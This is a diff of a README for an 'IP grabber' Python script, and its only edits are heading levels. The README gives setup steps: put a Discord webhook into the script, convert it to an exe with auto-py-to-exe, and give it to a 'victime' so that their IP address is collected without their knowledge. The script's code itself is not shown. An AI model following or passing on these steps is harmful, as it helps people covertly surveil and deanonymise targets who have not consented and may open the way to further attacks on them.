@@ -1,11 +1,11 @@
-### IP grabber by unknown 
+# IP grabber by unknown 
 
-# description :
+### description :
 
 this is a script to grab anyones ip using python. very easy to setup and grab
 
 
-# setup:
+### setup:
 
 * put your discord webhook in line number 1. example:
 ```
@@ -14,12 +14,12 @@ webhook = "https://discord.com/api/webhooks/1064867556961288242/eQDUAr4E4cv8wuCx
 * convert that in to exe. you can use [auto-py-to-exe](https://github.com/brentvollebregt/auto-py-to-exe)
 * give that to your victime
 
-#requirements the victime need:
+### requirements the victime need:
 * pc
 * python
 * every module will be downloaded automatically
 
-# want to get ip info?
+### want to get ip info?
 
 use my ip info script to get all info of the ip
 
